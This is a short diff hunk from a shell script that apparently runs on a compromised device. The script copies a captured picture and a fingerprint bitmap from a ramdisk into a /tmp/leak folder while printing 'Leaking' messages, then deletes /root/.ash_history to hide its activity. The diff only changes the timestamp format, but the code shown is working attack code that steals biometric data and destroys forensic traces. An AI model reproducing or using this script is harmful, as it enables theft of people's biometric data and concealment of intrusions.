@@ -21,14 +21,14 @@ do
         printf ' Same Shit...\n'
       else
         printf '[+] Leaking ...'
-        cp /mnt/ramdisk/picture.jpg /tmp/leak/picture.jpg."$(date)"
+        cp /mnt/ramdisk/picture.jpg /tmp/leak/picture.jpg."$dt"
       fi
 
       if [ cmp -s "$fp" "$fpv2" ] ; then
         printf ' Same Shit...\n'
       else
         printf '[+] Leaking...'
-        cp /mnt/ramdisk/finger.bmp /tmp/leak/finger.bmp."$(date)"
+        cp /mnt/ramdisk/finger.bmp /tmp/leak/finger.bmp."$dt"
       fi
 
       rm -rf /root/.ash_history
